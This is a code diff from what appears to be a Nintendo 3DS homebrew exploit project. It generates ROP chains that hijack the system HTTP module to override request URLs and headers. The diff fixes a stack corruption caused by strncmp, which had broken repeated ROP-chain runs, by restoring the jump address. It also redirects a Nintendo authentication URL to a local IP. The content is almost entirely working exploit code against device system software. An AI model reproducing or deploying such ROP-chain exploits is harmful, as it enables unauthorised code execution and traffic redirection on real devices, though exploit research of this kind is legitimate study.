@@ -119,8 +119,6 @@ typedef struct {
 	char new_url[0x100];//Optional, when set the specified URL will overwrite the URL used with CreateContext, NUL-terminator included.
 } targeturlctx;
 
-//Currently the ROP ignores the entries starting with the second one for the targeturlctx and targeturl_requestoverridectx lists. This is caused by re-running ROP-chains which calls strncmp. On the first run strncmp will corrupt the stack, but not anything to cause a crash. It overwrites a jump-addr with strncmp-entry LR, which then turns the strncmp call in the ROP-chain into a NOP. Hence, on all following runs of that ROP-chain each strncmp call will always return non-zero.
-
 targeturl_requestoverridectx reqoverride_test[2] = {
 	{
 		.next = &reqoverride_test[1],
@@ -150,7 +148,8 @@ targeturlctx targeturl_list[] = {
 
 	{//Used by friends-sysmodule and AC-sysmodule, however it's unknown if AC ever runs the code for it.
 		.caps = TARGETURLCAP_AddRequestHeader | TARGETURLCAP_AddPostDataAscii,
-		.url = "https://nasc.nintendowifi.net/ac"
+		.url = "https://nasc.nintendowifi.net/ac",
+		.new_url = "http://10.0.0.30/"
 	},
 
 	/*
@@ -522,14 +521,16 @@ void ropgen_requestoverride(u32 **ropchain, u32 *http_ropvaddr, u32 firstptr_ctx
 
 	ropgen_ldrr0r1(ropchain, http_ropvaddr, namebufptr_vaddr, 1);
 	ropgen_blxr3(ropchain, http_ropvaddr, ROP_strlen, 1);//Overwrite the r2 value which will be used for the below strncmp with strlen(input_namebuf).
-	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20*5 + 0x40 + 0x4, 1);
+	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20*5 + 0x30 + 0x40 + 0x4, 1);
 
 	ropgen_ldrr0r1(ropchain, http_ropvaddr, namebufptr_vaddr, 1);
-	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20*3 + 0x40 + 0x3c + 0x4, 1);//Overwrite the r0 value which will be used for the below strncmp with input_namebuf.
+	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20*3 + 0x30 + 0x40 + 0x3c + 0x4, 1);//Overwrite the r0 value which will be used for the below strncmp with input_namebuf.
 
 	ropgen_ldrr0r1(ropchain, http_ropvaddr, curent, 1);
 	ropgen_add_r0ip(ropchain, http_ropvaddr, offsetof(targeturl_requestoverridectx, name));
-	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below strncmp with curent->name.
+	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20 + 0x30 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below strncmp with curent->name.
+
+	ropgen_writeu32(ropchain, http_ropvaddr, ROP_strncmp, *http_ropvaddr + 0x30 + 0x64, 1);//Calling strncmp() will overwrite two words on stack. On the next run of this ROP-chain, this will restore the jump-addr(the other overwritten word doesn't matter here since it's params[3]).
 
 	ropgen_callfunc(ropchain, http_ropvaddr, ROP_strncmp, params);//strncmp(input_namebuf, curent->name, strlen(input_namebuf));
 
@@ -550,14 +551,16 @@ void ropgen_requestoverride(u32 **ropchain, u32 *http_ropvaddr, u32 firstptr_ctx
 
 	ropgen_ldrr0r1(ropchain, http_ropvaddr, valuebufptr_vaddr, 1);
 	ropgen_blxr3(ropchain, http_ropvaddr, ROP_strlen, 1);//Overwrite the r2 value which will be used for the below strncmp with strlen(input_valuebuf).
-	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20*5 + 0x40 + 0x4, 1);
+	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20*5 + 0x30 + 0x40 + 0x4, 1);
 
 	ropgen_ldrr0r1(ropchain, http_ropvaddr, valuebufptr_vaddr, 1);
-	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20*3 + 0x40 + 0x3c + 0x4, 1);//Overwrite the r0 value which will be used for the below strncmp with input_valuebuf.
+	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20*3 + 0x30 + 0x40 + 0x3c + 0x4, 1);//Overwrite the r0 value which will be used for the below strncmp with input_valuebuf.
 
 	ropgen_ldrr0r1(ropchain, http_ropvaddr, curent, 1);
 	ropgen_add_r0ip(ropchain, http_ropvaddr, offsetof(targeturl_requestoverridectx, value));
-	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below strncmp with curent->value.
+	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20 + 0x30 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below strncmp with curent->value.
+
+	ropgen_writeu32(ropchain, http_ropvaddr, ROP_strncmp, *http_ropvaddr + 0x30 + 0x64, 1);//Calling strncmp() will overwrite two words on stack. On the next run of this ROP-chain, this will restore the jump-addr(the other overwritten word doesn't matter here since it's params[3]).
 
 	ropgen_callfunc(ropchain, http_ropvaddr, ROP_strncmp, params);//strncmp(input_valuebuf, curent->value, strlen(input_valuebuf));
 
@@ -995,10 +998,12 @@ Result setuphaxx_httpheap_sharedmem()
 		ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x2c, 1);//Write the curent->url address to ropheap+0x2c.
 
 		ropgen_blxr3(&ropchain, &ropvaddr, ROP_strlen, 1);//Overwrite the r2 value which will be used for the below strncmp with strlen(curent->url).
-		ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20*3 + 0x4, 1);
+		ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20*3 + 0x30 + 0x4, 1);
 
 		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x2c, 1);
-		ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below strncmp with curent->url.
+		ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x30 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below strncmp with curent->url.
+
+		ropgen_writeu32(&ropchain, &ropvaddr, ROP_strncmp, ropvaddr + 0x30 + 0x64, 1);//Calling strncmp() will overwrite two words on stack. On the next run of this ROP-chain, this will restore the jump-addr(the other overwritten word doesn't matter here since it's params[3]).
 
 		ropgen_callfunc(&ropchain, &ropvaddr, ROP_strncmp, params);
 
